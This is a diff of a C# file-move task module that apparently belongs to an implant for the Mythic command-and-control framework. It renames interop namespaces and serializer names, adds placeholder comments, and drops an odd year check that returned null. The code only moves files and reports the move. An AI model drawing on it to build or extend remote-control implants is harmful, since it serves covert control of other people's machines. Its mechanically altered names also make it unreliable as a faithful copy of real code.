@@ -9,10 +9,10 @@
 using System;
 using System.IO;
 using System.Runtime.Serialization;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Utils;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Utils;
 
 
 namespace Tasks
@@ -30,14 +30,14 @@ namespace Tasks
             results.Path = path;
             if (path.StartsWith("\\\\")) results.Host = path.Split('\\')[2];
 
-            if(DateTime.Now.Year > 2020) { return results; } else { return null; }
+            return results;
         }
 
         public override void Start()
         {
             MythicTaskResponse resp;
             HostFileInfo sourceInfo;
-            var parameters = _dataSerializer.Deserialize<MvParameters>(_data.Parameters);
+            var parameters = _jsonSerializer.Deserialize<MvParameters>(_data.Parameters);
 
             if (!PathUtils.TryGetExactPath(parameters.SourceFile, out _))
             {
@@ -76,7 +76,7 @@ namespace Tasks
                         $"Moved {sinfo.FullName} to {dinfo.FullName}",
                         true,
                         "completed",
-                        new ICommandMessage[]
+                        new IMythicMessage[]
                         {
                             Artifact.FileOpen(sinfo.FullName),
                             Artifact.FileDelete(sinfo.FullName),
@@ -100,9 +100,9 @@ namespace Tasks
                 }
             }
 
-            
-            
-            
+            // Your code here..
+            // CreateTaskResponse to create a new TaskResposne object
+            // Then add response to queue
             _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
 
